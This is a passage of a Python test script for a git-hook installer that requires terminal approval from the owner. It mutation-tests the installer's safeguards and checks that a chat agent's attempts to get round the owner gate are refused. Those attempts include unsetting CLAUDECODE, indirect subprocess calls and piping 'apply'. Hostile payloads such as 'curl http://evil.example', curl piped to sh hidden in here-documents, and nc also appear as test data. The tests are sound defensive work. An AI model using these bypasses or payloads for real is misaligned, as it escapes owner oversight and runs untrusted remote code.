    os.environ["SHIPMIRACLE_ENFORCE_OWNER"] = "1"; os.environ["CLAUDECODE"] = "1"
    return mk(old=OLD)


def reset_env():
    os.environ.pop("SHIPMIRACLE_ENFORCE_OWNER", None); os.environ.pop("CLAUDECODE", None); owner._CHAIN_OVERRIDE = None


def sc_symlink_proposal():
    r_ = mk(old=OLD); p = r_ / "docs/proposed-hooks/pre-commit.txt"; p.unlink(); os.symlink(str(real), str(p)); return r_


def sc_hardlink():
    r_ = mk(old=OLD); os.link(str(r_ / "docs/proposed-hooks/pre-commit.txt"), str(BASE / ("hlm%d" % _n[0]))); return r_


def sc_swap_hook():
    return mk(old=OLD)


M = [
    ("lock 1+2: the owner gate removed", ('    owner.gate("hooks-apply", hint)\n', "    pass\n"), sc_claude, {}),
    ("lock 1: the owner gate removed (CLAUDECODE)", ('    owner.gate("hooks-apply", hint)\n', "    pass\n"), sc_claudecode, {}),
    ("stdin must be a terminal", ("    if not _stdin_is_tty():\n", "    if False:\n"), lambda: mk(old=OLD), {"stdin_tty": False}),
    ("typed word compared", ("                if word != TYPED_WORD:\n", "                if False:\n"), lambda: mk(old=OLD), {"word": "no"}),
    ("typed word is exact (strip and case)", ("                if word != TYPED_WORD:\n", "                if word.lower().find(TYPED_WORD) < 0:\n"), lambda: mk(old=OLD), {"word": "please APPLY now"}),
    ("proposal read without following links", ("os.O_RDONLY | os.O_NOFOLLOW | os.O_NONBLOCK | os.O_CLOEXEC, dir_fd=dirfd)", "os.O_RDONLY | os.O_NONBLOCK | os.O_CLOEXEC, dir_fd=dirfd)"), sc_symlink_proposal, {}),
    ("hard link refused", ("if single_link and st.st_nlink != 1:", "if False:"), sc_hardlink, {}),
    ("shebang checked", ("    if not SHEBANG_RE.fullmatch(first):\n", "    if False:\n"), lambda: mk(old=OLD, proposal="#!/usr/bin/perl\nprint 1;\n"), {}),
    ("denylist applied", ("            m = rx.search(line)\n            if m:", "            m = None\n            if m:"), lambda: mk(old=OLD, proposal="#!/bin/sh\ncurl http://x.example\n"), {}),
    ("size cap applied (check_content)", ("    if len(data) > MAX_BYTES:\n", "    if False:\n"), "DIRECT_SIZE", {}),
    ("control characters refused", ("        if (o < 32 and ch not in", "        if (False and o < 32 and ch not in"), lambda: mk(old=OLD, proposal="#!/bin/sh\necho \x1b[2J\n"), {}),
    ("proposal re-read and compared", ("            if raw2 is None or _sha(raw2) != digest:\n", "            if False:\n"), lambda: mk(old=OLD), {"hook": "SWAP"}),
    ("current hook re-read and compared", ("            if (old2 is None) != (old is None) or (old2 is not None and _sha(old2) != _sha(old)):\n", "            if False:\n"), lambda: mk(old=OLD), {"hook": "SWAPHOOK"}),
    ("hooks folder permission check", ("            if hst.st_mode & 0o022:\n", "            if False:\n"), lambda: mk(old=OLD), {"hook": "GROUPW"}),
    ("hooksPath absolute refused (hooks_folder)", ('    if val.startswith(("/", "~")) or "\\0" in val or "\\\\" in val:\n', "    if False:\n"), "DIRECT_ABS", {}),
    ("hooksPath .. / .git refused", ('    if not parts or any(unicodedata.normalize("NFKC", p).casefold().rstrip(". ") in ("..", ".git", "") for p in parts):\n', "    if False:\n"), lambda: mk(hooks_path=".git/hooks", make_dir=False), {}),
    ("name validated", ("    name = validate_name(name)\n", "    pass\n"), None, {}),
]
for label, (old_s, new_s), setup, kw in M:
    mm = mutant(old_s, new_s)
    if setup == "DIRECT_SIZE":
        try:
            mm.check_content(("#!/bin/sh\n" + "# pad\n" * 5500).encode()); acc = True
        except ShipmiracleError:
            acc = False
        check("mutant '%s' is noticed (an oversized proposal gets through)" % label, acc)
        continue
    if setup == "DIRECT_ABS":
        rr_ = mk(hooks_path="/tmp/x", make_dir=False)
        try:
            acc = mm.hooks_folder(str(rr_)) == ["tmp", "x"]
        except ShipmiracleError:
            acc = False
        try:
            GA.hooks_folder(str(rr_)); real_ok = True
        except ShipmiracleError:
            real_ok = False
        check("mutant '%s' is noticed (an absolute core.hooksPath is read as a path inside the project)" % label, acc and not real_ok, (acc, real_ok))
        continue
    if label == "name validated":
        r = mk(old=OLD)
        with Stubs():
            rc, exc, tty, out = drive(mm, "../x", r)
        noticed = not (isinstance(exc, ShipmiracleError) and "hook name" in str(exc))
        check("mutant '%s' is noticed (an invalid name gets past the mutant)" % label, noticed, (rc, exc))
        continue
    kw = dict(kw)
    mode = kw.pop("hook", None)
    holder = {}
    if mode == "SWAP":
        def setup2(setup=setup):
            holder["r"] = setup(); return holder["r"]
        hookfn = lambda pt, *a: (holder["r"] / "docs/proposed-hooks/pre-commit.txt").write_text("#!/bin/sh\necho SWAPPED\n") if pt == "after_typed" else None
        # a mutant that skips the re-read still writes the SHOWN bytes; the damage test is that the guarded refusal is gone
        with Stubs():
            r = setup2(); rc, exc, tty, out = drive(mm, "pre-commit", r, hook=hookfn)
        changed = isinstance(exc, ShipmiracleError) and "changed after" in str(exc)
        check("mutant '%s' is noticed (no refusal of the swapped proposal)" % label, not changed, (rc, exc))
        continue
    if mode == "SWAPHOOK":
        with Stubs():
            r = setup(); rc, exc, tty, out = drive(mm, "pre-commit", r, hook=lambda pt, *a: (r / ".githooks/pre-commit").write_text("#!/bin/sh\necho CHANGED\n") if pt == "after_typed" else None)
        check("mutant '%s' is noticed (the changed hook is overwritten)" % label, hook_of(r) == GOOD.encode(), (rc, exc))
        continue
    if mode == "GROUPW":
        with Stubs():
            r = setup(); os.chmod(str(r / ".githooks"), 0o775)
            rc, exc, tty, out = drive(mm, "pre-commit", r)
            os.chmod(str(r / ".githooks"), 0o755)
        check("mutant '%s' is noticed (installs into a group-writable folder)" % label, hook_of(r) == GOOD.encode(), (rc, exc))
        continue
    got = attack_installed(mm, setup, **kw)
    reset_env()
    if label.startswith("hooksPath .."):
        got = got or (BASE / ("p%d" % _n[0]) / ".git/hooks/pre-commit").exists()
    check("mutant '%s' is noticed (the attack succeeds on the mutant)" % label, got, label)
    # and the same attack on the real module fails
    rr = attack_installed(GA, setup, **kw)
    reset_env()
    check("same attack on the real module fails: '%s'" % label, not rr, label)

# mutants of the writing side
r = mk(old=OLD)
m1 = mutant("        os.fchmod(fd, 0o755)\n", "        os.fchmod(fd, 0o644)\n")
hfd = os.open(str(r / ".githooks"), os.O_RDONLY | os.O_DIRECTORY); m1.write_hook(hfd, "pre-commit", GOOD.encode()); os.close(hfd)
check("mutant 'mode 0755' is noticed (mode is not executable)", (r / ".githooks/pre-commit").stat().st_mode & 0o777 != 0o755)
r = mk(old=OLD)
m2 = mutant("        try:\n            os.unlink(tmp, dir_fd=hooks_fd)\n        except OSError:\n            pass\n        raise\n", "        raise\n")
m2._chain_hook = boom
hfd = os.open(str(r / ".githooks"), os.O_RDONLY | os.O_DIRECTORY)
try:
    m2.write_hook(hfd, "pre-commit", GOOD.encode())
except RuntimeError:
    pass
os.close(hfd)
check("mutant 'temp file removed on failure' is noticed (a temp file stays)", leftovers(r) != [], leftovers(r))
r = mk(old=OLD)
m3 = mutant("            bpath = _backup(old, name, root) if old is not None else \"\"\n", "            bpath = \"\"\n")
with Stubs():
    bn = len(list(BACKUPS.glob("*pre-commit*")))
    drive(m3, "pre-commit", r)
check("mutant 'backup made' is noticed (the hook is replaced and no backup exists)", hook_of(r) == GOOD.encode() and len(list(BACKUPS.glob("*pre-commit*"))) == bn)
r = mk(old=OLD)
m4 = mutant("                _say(tfd, shown)\n", "                pass\n")
with Stubs():
    rc, exc, tty, out = drive(m4, "pre-commit", r)
check("mutant 'diff shown' is noticed (no diff on the screen)", "proposed pre-commit" not in tty and "--- current" not in tty)
rc, exc, tty, out = (None, None, "", [])
with Stubs():
    r = mk(old=OLD)
    rc, exc, tty, out = drive(GA, "pre-commit", r)
check("the real module shows the diff on the terminal before it asks", "--- current pre-commit" in tty and tty.index("--- current") < tty.index("Type the word"), tty[:300])
r = mk(old=OLD)
m5 = mutant("            owner.touch(\"hooks-apply\"", "            (lambda *a, **k: None)(\"hooks-apply\"")
with Stubs() as S5:
    drive(m5, "pre-commit", r)
check("mutant 'presence check after the typed word' is noticed (touch never called)", "touch" not in S5.calls, S5.calls)

# ================================================================== 4  the flow gate (both copies)
print("# 4 gate")
import isolation_fixture as X
import flow_fixture as F
w = X.World()
(BASE / "w.sh").write_text("#!/bin/sh\nshipm hooks apply pre-commit\n")
for ag in (None, "backend-engineer"):
    t = " (agent)" if ag else ""
    for cmd in ("shipm hooks apply pre-commit", "shipm hooks apply x", "shipm hooks apply post-commit --json", "shipm --json hooks apply pre-push", "SHIPM hooks apply x", "bin/shipm hooks apply pre-commit",
                "./bin/shipm hooks apply pre-commit", "python3 bin/shipm hooks apply pre-commit", "python3 -m shipmiracle hooks apply x", "env -u CLAUDECODE shipm hooks apply pre-commit",
                "env CLAUDECODE= shipm hooks apply x", "sh -c 'shipm hooks apply pre-commit'", "bash -c \"shipm hooks apply x\"", "cd /tmp && shipm hooks apply x", "echo apply | shipm hooks apply pre-commit",
                "shipm hooks   apply   x", "'shipm' hooks apply x", "shipm 'hooks' 'apply' x", "SHIPMIRACLE_TEST=1 shipm hooks apply x", "xargs shipm hooks apply <<< x", "yes apply | shipm hooks apply pre-commit",
                "python3 -c \"import subprocess; subprocess.run(['shipm','hooks','apply','pre-commit'])\"", "python3 -c \"import importlib; importlib.import_module('shipmiracle.githook_apply')\"",
                "a=hooks; shipm $a apply", "shipm $'hooks' apply x", "printf 'shipm hooks apply x' | sh", "sh %s" % (BASE / "w.sh"), "bash %s" % (BASE / "w.sh"), "source %s" % (BASE / "w.sh"),
                "perl -e 'system(\"shipm\",\"hooks\",\"apply\",\"x\")'", "node -e \"require('child_process').spawnSync('shipm',['hooks','apply','x'])\"", "ruby -e 'system(\"shipm hooks apply x\")'",
                "env SHIPMIRACLE_TEST=1 HOME=/tmp/h python3 -c \"import subprocess; subprocess.run(['shipm','hooks','apply','x'])\"",
                "python3 -m shipmiracle.githook_apply", "python3 -c \"from shipmiracle import githook_apply\""):
        for impl, _ in X.IMPLS:
            o = w.call("Bash", {"command": cmd}, impl, agent=ag)
            check("chat%s typing '%s' is refused (%s)" % (t, cmd, impl), F.deny(o), o)
    for cmd in ("shipm hooks mode", "shipm hooks spec --mode v1", "shipm hooks shadow-report", "git commit -m 'shipm hooks apply'", "grep 'hooks apply' docs/owner-steps/edit-githooks.md", "git add shipmiracle/githook_apply.py", "grep githook_apply shipmiracle/cli.py", "cat shipmiracle/githook_apply.py"):
        for impl, _ in X.IMPLS:
            o = w.call("Bash", {"command": cmd}, impl, agent=ag)
            check("chat%s may do '%s' (%s)" % (t, cmd, impl), not F.deny(o), o)
check("hook error log stays empty", w.p.errors().strip() == "", w.p.errors()[:300])
w.cleanup()

# ================================================================== 5  security review fix round
print("# 5 fix round")
import re as _re
OUTSIDE = pathlib.Path(tempfile.mkdtemp(prefix="hkout-", dir="/var/tmp")).resolve()
outside_real = not paths._under_temp(str(OUTSIDE))
check("(harness) /var/tmp is outside the temp roots on this machine", outside_real, str(OUTSIDE))

# (1) complete sandbox env, project outside the sandbox roots, the terminal answers apply -> refused
r = mk(old=OLD, base=OUTSIDE)
nb = len(list(BACKUPS.glob("*"))) if BACKUPS.exists() else 0
with Stubs() as S:
    rc, exc, tty, out = drive(GA, "pre-commit", r)
check("B1 in-process: project outside the sandbox, sandbox env complete, apply answered: refused, hook unchanged, no backup, nothing shown",
      isinstance(exc, GA.Refused) and "temp project" in str(exc) and hook_of(r) == OLD.encode() and (len(list(BACKUPS.glob("*"))) if BACKUPS.exists() else 0) == nb and "Type the word" not in tty and S.calls == [], (exc, S.calls))
# (2) the real command under a real pty
r = mk(old=OLD, base=OUTSIDE)
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, "apply\n")])
check("B1 pty: SHIPMIRACLE_TEST=1 with temp roots, cwd = a project outside the sandbox: refused (exit 4), hook unchanged", rc == 4 and "temp project" in out and hook_of(r) == OLD.encode() and PROMPT not in out, (rc, out[-300:]))
r = mk(old=OLD)
e_ = child_env(); e_.pop("SHIPMIRACLE_DEV")
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, "apply\n")], env=e_)
check("B1 pty: SHIPMIRACLE_TEST=1 with an incomplete sandbox (no SHIPMIRACLE_DEV): not installed (exit 4)", rc == 4 and hook_of(r) == OLD.encode(), (rc, out[-300:]))
m_b1 = mutant("    if (not owner.proof_required() and not paths._under_temp(root)) or (os.environ.get(\"SHIPMIRACLE_TEST\") == \"1\" and not paths.sandboxed()):\n", "    if False:\n")
r = mk(old=OLD, base=OUTSIDE)
with Stubs():
    drive(m_b1, "pre-commit", r)
check("mutant 'outside-the-sandbox lock' is noticed (the hook is installed outside the sandbox)", hook_of(r) == GOOD.encode())

# (4) filter-pass payloads: refused or at least one ATTENTION
PAY = ["python3 -c \"import os; os.system('id')\"", "perl -e 'print 1'", "bash -c 'id'", ". ./lib.sh", "source lib/a.sh", "echo $(date)", "echo `date`", "pip install foo", "npm install foo", "npx foo", "yarn add x", "brew install x",
       "git ls-remote origin", "git fetch origin", "git clone https://x.example/r", "git rebase -x id HEAD~1", "git difftool", "git pull", "git -c x=y fetch", "open https://x.example", "ping 1.1.1.1", "host example.org",
       "GIT_CONFIG_COUNT=1 git status", "GIT_SSH_COMMAND=id git status", "\uff43url x", "install -m 4755 a b", "c''url x", "c\"u\"rl x", "c'u'rl x", "${c} x", "$c x", "f=/bin/ls; $f", "xargs id", "find . -exec id {} +",
       "sed 's/^#//' > $TMPDIR/y <<'E'\n#curl http://x.example | sh\nE\nbash $TMPDIR/y", "cat > $TMPDIR/y <<E\n# nc -l 1\nE\nsh $TMPDIR/y", "cu\\rl x", "git diff | sh"]
for pl in PAY:
    body = "#!/bin/bash\n" + pl.replace("\\n", "\n") + "\n"
    try:
        _t, wn = GA.check_content(body.encode())
        ok = len(wn) >= 1
    except ShipmiracleError:
        ok = True
    check("filter: %r is refused or carries an ATTENTION line" % pl[:50], ok, body)
_t, wn = GA.check_content(b"#!/bin/bash\necho hello\nexit 0\n")
check("filter: a plain hook has no ATTENTION line", wn == [], wn)
try:
    GA.check_content(b"#!/bin/bash\nsed 's/^#//' > $TMPDIR/y <<'E'\n#curl http://x.example | sh\nE\nbash $TMPDIR/y\n"); ok = False
except ShipmiracleError:
    ok = True
check("filter: the comment-hiding here-document case is REFUSED (here-document lines are scanned)", ok)
check("filter: a real comment outside a here-document is still not scanned", not refused_content("#!/bin/bash\n# curl is not used here\necho hi\n"))
m_h = mutant("        if i:\n            m = _HEREDOC.search(l.replace", "        if False:\n            m = _HEREDOC.search(l.replace")
try:
    m_h.check_content(b"#!/bin/bash\nsed 's/^#//' > $TMPDIR/y <<'E'\n#curl http://x.example | sh\nE\nbash $TMPDIR/y\n"); acc = True
except ShipmiracleError:
    acc = False
check("mutant 'here-document lines are scanned' is noticed", acc)

# (5) indirection
IND = ["./scripts/check.sh", "bash tools/x.sh", "source lib/a.sh", "npm run lint", "make test", "python3 -m pytest", "pytest -q", "node tools/x.js", "tox", "python3 scripts/run.py", "cd x && ../tools/y", "yarn test", "pnpm exec foo"]
for pl in IND:
    try:
        _t, wn = GA.check_content(("#!/bin/bash\n" + pl + "\n").encode())
        ok = any("runs a project file that a chat can change later" in x for x in wn)
    except ShipmiracleError:
        ok = True
    check("indirection: %r gets the 'project file a chat can change' ATTENTION" % pl, ok, pl)
check("indirection: an absolute system program does not", not any("project file" in x for x in GA.check_content(b"#!/bin/bash\n/usr/bin/git status\nexit 0\n")[1]))
r = mk(old=OLD, proposal="#!/bin/bash\n./scripts/check.sh\n")
(r / "scripts").mkdir(); (r / "scripts/check.sh").write_text("echo hi\n")
pins = GA.pin_samples(str(r), "#!/bin/bash\n./scripts/check.sh\n")
check("pin sample: a shasum -c line with the real sha256 of the called script", len(pins) == 1 and sha(b"echo hi\n") in pins[0] and "shasum -a 256 -c" in pins[0], pins)
rc, out = apply_typed(r)
check("pty: the screen shows the indirection ATTENTION and the pin sample, and the summary line", "runs a project file that a chat can change later: ./scripts/check.sh" in out and "To pin" in out and "shasum" in out and "Summary (from the real file)" in out, out[:900])

# (6) touch reason carries the real counts; a fake diff on the tty changes nothing
r = mk(old=OLD)
add_, rem_, first_ = GA.change_summary(OLD.encode(), GOOD)
with Stubs() as S:
    rc, exc, tty, out = drive(GA, "pre-commit", r, hook=lambda pt, *a: os.write(fd_fake, b"\n+++ FAKE: +0 -0 lines\n") if False else None)
    reason = S.reasons[-1] if S.reasons else ""
check("MINOR5: the presence reason carries the real added/removed counts and the first new command", "+%d -%d lines" % (add_, rem_) in reason and "first new command: set -e" in reason and (add_, rem_) == (3, 2), (reason, add_, rem_))
check("MINOR5: the owner.py honest limits mention a same-user program writing to the terminal", "WRITE to the owner's terminal" in (ROOT / "shipmiracle/owner.py").read_text())

# (7) tiers
r = mk(old=OLD)
with Stubs(sel_obj=FakeSel("basic")) as S:
    rc, exc, tty, out = drive(GA, "pre-commit", r)
check("basic tier: only the code (no 'apply' prompt), installed after the presence check, reason starts 'Read it all, then type this code to install'",
      exc is None and rc == 0 and "Type the word" not in tty and hook_of(r) == GOOD.encode() and S.reasons and S.reasons[-1].startswith("Read it all, then type this code to install"), (exc, tty[-200:], S.reasons))
r = mk(old=OLD)
with Stubs(sel_obj=FakeSel("medium")) as S:
    rc, exc, tty, out = drive(GA, "pre-commit", r)
check("medium tier: 'apply' is typed AND the presence check runs", exc is None and "Type the word" in tty and S.calls == ["select", "touch"] and S.reasons[-1].startswith("Shipmiracle: install git hook"), (exc, S.calls, S.reasons))
r = mk(old=OLD)
with Stubs(sel_obj=FakeSel("medium")) as S:
    drive(GA, "pre-commit", r)
check("min tier is medium by default", S.kw and S.kw[-1].get("min_tier") == "medium", S.kw)
r = mk(old=OLD)
with Stubs(sel_obj=FakeSel("basic"), setting="basic-ok") as S:
    drive(GA, "pre-commit", r)
check("min tier is basic only when owner.presence is basic-ok", S.kw and S.kw[-1].get("min_tier") == "basic", S.kw)
m_t = mutant("    basic = sel is not None and getattr(sel, \"tier\", \"\") == \"basic\"\n", "    basic = False\n")
r = mk(old=OLD)
with Stubs(sel_obj=FakeSel("basic")):
    rc, exc, tty, out = drive(m_t, "pre-commit", r)
check("mutant 'basic tier uses only the code' is noticed (the apply prompt shows)", "Type the word" in tty)
m_t2 = mutant("min_tier=\"basic\" if setting == \"basic-ok\" else \"medium\")", "min_tier=\"basic\")")
r = mk(old=OLD)
with Stubs() as S:
    drive(m_t2, "pre-commit", r)
check("mutant 'minimum tier medium' is noticed", S.kw and S.kw[-1].get("min_tier") == "basic")

# (8) the file written is not the file read after the rename -> loud error, old hook restored
for had_old in (True, False):
    r = mk(old=OLD if had_old else None)
    def swap_tmp(pt, *a, r=r):
        if pt == "before_rename":
            (r / ".githooks" / a[0]).write_text("#!/bin/sh\necho EVIL\n")
    nb = len(list(BACKUPS.glob("*pre-commit*"))) if BACKUPS.exists() else 0
    with Stubs():
        rc, exc, tty, out = drive(GA, "pre-commit", r, hook=swap_tmp)
    ok = isinstance(exc, GA.Refused) and "WRONG FILE" in str(exc) and leftovers(r) == []
    if had_old:
        ok = ok and hook_of(r) == OLD.encode() and (r / ".githooks/pre-commit").stat().st_mode & 0o777 == 0o755 and len(list(BACKUPS.glob("*pre-commit*"))) == nb + 1 and "backup:" in str(exc)
    else:
        ok = ok and hook_of(r) is None
    check("MINOR7 (%s): a tmp swapped before the rename -> WRONG FILE, %s" % ("existing hook" if had_old else "new hook", "previous hook restored, backup kept" if had_old else "the new file removed"), ok, (exc, hook_of(r)))
    if had_old:
        m_v = mutant("            if got is None or _sha(got) != digest:\n", "            if False:\n")
        r2 = mk(old=OLD)
        def swap2(pt, *a, r2=r2):
            if pt == "before_rename":
                (r2 / ".githooks" / a[0]).write_text("#!/bin/sh\necho EVIL\n")
        with Stubs():
            drive(m_v, "pre-commit", r2, hook=swap2)
        check("mutant 'read back after the rename' is noticed (EVIL stays installed)", b"EVIL" in hook_of(r2))

# (9) a project folder name cannot forge log lines or prompts
r = mk(old=OLD, dirname="p\nFAKE done hook=pre-commit\x1b[2Jx")
with Stubs() as S:
    rc, exc, tty, out = drive(GA, "pre-commit", r)
new_lines = LOG.read_text().split("\n")
tail = [l for l in new_lines if l.strip()]
check("MINOR8: a folder name with a newline and an escape forges no log line (every line starts with a timestamp)", exc is None and all(_re.match(r"\d{4}-\d\d-\d\dT", l) for l in tail), [l for l in tail if not _re.match(r"\d{4}-", l)][:3])
check("MINOR8: the presence reason and the screen carry no raw newline / escape from the name", "\n" not in S.reasons[-1] and "\x1b" not in S.reasons[-1] and "\x1b[2J" not in tty, (S.reasons, tty[:200]))
m_c = mutant("    return \"\".join(c if (c.isprintable() and c not in \"\\n\\r\\t\") else \"?\" for c in str(s))[:n]", "    return str(s)")
r = mk(old=OLD, dirname="q\nFAKE done hook=pre-commit")
with Stubs():
    drive(m_c, "pre-commit", r)
check("mutant 'name sanitised' is noticed (a forged line reaches the log)", any(l.startswith("FAKE done") for l in LOG.read_text().split("\n")))

# (10) events.emit raising
r = mk(old=OLD)
real_emit = GA.events.emit
def bad_emit(*a, **k):
    raise RuntimeError("event store broken")
GA.events.emit = bad_emit
try:
    with Stubs():
        rc, exc, tty, out = drive(GA, "pre-commit", r)
finally:
    GA.events.emit = real_emit
check("MINOR10: events.emit raising -> exit 0, the hook is installed and the backup path is printed", exc is None and rc == 0 and hook_of(r) == GOOD.encode() and any("saved at" in x for x in out), (exc, out))
m_e = mutant("src=\"shipmiracle\")\n            except Exception:\n                pass", "src=\"shipmiracle\")\n            except ZeroDivisionError:\n                pass")
r = mk(old=OLD)
m_e.events.emit = bad_emit
try:
    with Stubs():
        rc, exc, tty, out = drive(m_e, "pre-commit", r)
finally:
    m_e.events.emit = real_emit
check("mutant 'event failure is swallowed' is noticed", exc is not None or not any("saved at" in x for x in out) if False else (exc is not None))

# (9b) git is resolved once from a fixed place, never from a project file
r = mk(old=OLD)
(r / "bin").mkdir(); fake = r / "bin" / "git"
fake.write_text("#!/bin/sh\ntouch %s/GIT-RAN\nexit 1\n" % r); fake.chmod(0o755)
old_path = os.environ["PATH"]
os.environ["PATH"] = str(r / "bin") + ":" + old_path
try:
    gp = GA._git_path(str(r)); parts_ = GA.hooks_folder(str(r))
finally:
    os.environ["PATH"] = old_path
check("MINOR9: git comes from a system location, a git file inside the project on PATH is never run", not gp.startswith(str(r)) and not (r / "GIT-RAN").exists() and parts_ == [".githooks"], (gp, parts_))
shutil.rmtree(str(OUTSIDE), ignore_errors=True)

# (3b) gate mutants (legacy source): each new rule is noticed
if F.LEGACY_HOOK.exists():
    src_ = F.LEGACY_HOOK.read_text()
    tmpd = pathlib.Path(tempfile.mkdtemp())
    w3 = X.World()

    def gate_with(hook, cmd):
        e = dict(w3.env, CLAUDE_PROJECT_DIR=str(w3.P))
        d = {"hook_event_name": "PreToolUse", "session_id": "m1", "cwd": str(w3.P), "tool_name": "Bash", "tool_input": {"command": cmd}}
        rr = subprocess.run(["bash", hook], input=__import__("json").dumps(d), capture_output=True, text=True, env=e, cwd=str(w3.P))
        return F.deny(__import__("json").loads(rr.stdout) if rr.stdout.strip() else {})
    GM = [("raw text: hooks apply", "|hooks[\\s'\\\",\\[\\]]+apply)", ")", "python3 -c \"import subprocess; subprocess.run(['shipm','hooks','apply','x'])\""),
          ("raw text: githook_apply module", "|shipmiracle[.\\s'\\\",/]*(?:import\\s+)?githook_apply(?!\\.py\\b)", "", "node -e \"require('shipmiracle.githook_apply')\""),
          ("script file named on the command line", "with open(x_, \"rb\") as f_:", "with open(x_ + \".nope\", \"rb\") as f_:", "sh %s" % (BASE / "w.sh")),
          ("hooks in ADMIN_SUB", '"hooks": ("apply",), ', "", "shipm hooks --json apply x"),
          ("variable group word next to apply", '    if "apply" in args and any(', '    if False and any(', "a=hooks; shipm $a apply")]
    for nm, old_, new_, cmd in GM:
        found = src_.count(old_) == 1
        mp = tmpd / "mut.sh"
        mp.write_text(src_.replace(old_, new_, 1) if found else src_); os.chmod(mp, 0o755)
        orig = gate_with(str(F.LEGACY_HOOK), cmd)
        mut = gate_with(str(mp), cmd) if found else True
        check("gate mutant '%s' is noticed (original refuses, mutant lets it through)" % nm, found and orig and not mut, (found, orig, mut))
    w3.cleanup(); shutil.rmtree(tmpd, ignore_errors=True)


# ================================================================== 6  QA round: continuation, .git aliases, live path, Ctrl-C / EOF, false refusals
print("# 6 QA round")
BS = chr(92)


def _passes(mod, body):
    """True when the module's check_content accepts the text (does not raise)."""
    try:
        mod.check_content(body.encode()); return True
    except ShipmiracleError:
        return False


cont_payload = "#!/bin/sh\necho a" + BS + "\n#x; curl http://evil.example\n"
check("M1: a # line after a backslash continuation is not a comment: curl behind it is refused", refused_content(cont_payload))
check("M1: a # line inside an open double quote is scanned (| sh behind it is refused)", refused_content("#!/bin/sh\necho \"start\n# x | sh\n\"\n"))
check("M1: a # line inside an open single quote is scanned", refused_content("#!/bin/sh\necho 'start\n# wget http://x\n'\n"))
check("M1: an ordinary comment line is still skipped (also one after a line with a closed quote)", not refused_content("#!/bin/sh\necho 'a'\n# curl is not used\necho b\n"))
check("M1: an escaped backslash at line end is not a continuation", not refused_content("#!/bin/sh\necho a" + BS + BS + "\n# curl x\n"))
m_c1 = mutant("comment = i > 0 and not cont and inq is None and l.lstrip()", "comment = i > 0 and inq is None and l.lstrip()")
check("mutant 'continuation keeps the next # line' is noticed", _passes(m_c1, cont_payload))
m_c2 = mutant("comment = i > 0 and not cont and inq is None and l.lstrip()", "comment = i > 0 and not cont and l.lstrip()")
check("mutant 'open quote keeps the # line' is noticed", _passes(m_c2, "#!/bin/sh\necho \"start\n# x | sh\n\"\n"))

# m1: .git aliases on a case-insensitive file system
for hp in (".Git/hooks", ".GIT/hooks", ".git./hooks", ".git /hooks", ".git../hooks", "．git/hooks", ".git/../hooks", "sub/.GiT/hooks", ".git."):
    r = mk(hooks_path=hp, make_dir=False)
    try:
        GA.hooks_folder(str(r)); ok = False
    except ShipmiracleError:
        ok = True
    check("m1: core.hooksPath %r is refused as a .git alias" % hp, ok)
m_g = mutant("unicodedata.normalize(\"NFKC\", p).casefold().rstrip(\". \") in", "p in")
r = mk(hooks_path=".Git/hooks", make_dir=False)
try:
    m_g.hooks_folder(str(r)); acc = True
except ShipmiracleError:
    acc = False
check("mutant '.git alias check' is noticed (.Git/hooks accepted)", acc)
check("m1: a normal .githooks / tools/hooks stays accepted", GA.hooks_folder(str(mk(hooks_path=".githooks"))) == [".githooks"] and GA.hooks_folder(str(mk(hooks_path="tools/hooks"))) == ["tools", "hooks"])

# m2: the hooks folder is replaced between the write and the end
for variant in ("fresh folder", "symlink"):
    r = mk(old=OLD)

    def swap_dir(pt, *a, r=r, variant=variant):
        if pt == "after_write":
            os.rename(str(r / ".githooks"), str(r / ".githooks.old"))
            if variant == "symlink":
                os.symlink(str(r / ".githooks.old"), str(r / ".githooks"))
            else:
                os.mkdir(str(r / ".githooks"), 0o755)
    with Stubs():
        rc, exc, tty, out = drive(GA, "pre-commit", r, hook=swap_dir)
    check("m2 (%s): the folder replaced after the write -> WRONG PLACE (exit 4), never 'installed'" % variant, isinstance(exc, GA.Refused) and "WRONG PLACE" in str(exc) and not any("installed" in x for x in out), (exc, out))
m_w = mutant("            if not same or live is None or _sha(live) != digest:\n", "            if False:\n")
r = mk(old=OLD)
def swap_dir2(pt, *a, r=r):
    if pt == "after_write":
        os.rename(str(r / ".githooks"), str(r / ".githooks.old")); os.mkdir(str(r / ".githooks"), 0o755)
with Stubs():
    rc, exc, tty, out = drive(m_w, "pre-commit", r, hook=swap_dir2)
check("mutant 'live path verified' is noticed (it reports installed)", exc is None and any("installed" in x for x in out))

# m3: Ctrl-C and EOF at the prompt
r = mk(old=OLD)
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, b"\x03")])
check("m3: Ctrl-C at the prompt: plain 'Cancelled' (exit 4), no traceback, hook unchanged", rc == 4 and "Cancelled" in out and "Traceback" not in out and hook_of(r) == OLD.encode(), (rc, out[-300:]))
r = mk(old=OLD)
t0 = time.time()
rc, out = pty_run(["hooks", "apply", "pre-commit"], r, [(PROMPT, b"apply"), ("apply", b"\x04")], timeout=30)
check("m3: 'apply' then Ctrl-D without a newline is a cancel at once (not a 120 s wait), nothing installed", rc == 4 and time.time() - t0 < 25 and hook_of(r) == OLD.encode(), (rc, time.time() - t0, out[-200:]))
r = mk(old=OLD)
with Stubs() as S:
    def raise_int(*a, **k):
        raise KeyboardInterrupt()
    owner.touch = raise_int
    rc, exc, tty, out = drive(GA, "pre-commit", r)
check("m3: Ctrl-C during the presence check: 'Cancelled', nothing installed", isinstance(exc, GA.Refused) and "Cancelled" in str(exc) and hook_of(r) == OLD.encode(), exc)

# false refusals fixed (these were refused before; none of them is a network / exec action)
GOODS = ["git diff --cached --name-only | python3 -m json.tool", "exec \"$(dirname \"$0\")/run-checks\"", "echo \"see .githooks and .env.example for details\" >&2", "cat .env.example", "chmod +x scripts/run.sh",
         "echo \"requests are sent by ssh; run sudo later\"", "git config --get core.hooksPath", "echo \"curl is missing\" >&2", "command -v curl >/dev/null 2>&1 || exit 0", "printf '%s\\n' \"no wget here\"",
         "git config --list", "ls .githooks"]
for gd in GOODS:
    ok_ = _passes(GA, "#!/bin/bash\n" + gd + "\n")
    check("fewer false refusals: %r is accepted (ATTENTION lines may appear)" % gd[:60], ok_)
for bd in ["curl http://x.example", "x && curl y", "if true; then wget z; fi", "env FOO=1 curl x", "nohup curl x &", "sudo -n launchctl x", "echo hi | nc h 1", "bash -c \"curl x\"", "echo \"$(curl x)\"", "xargs curl", "/usr/bin/curl x",
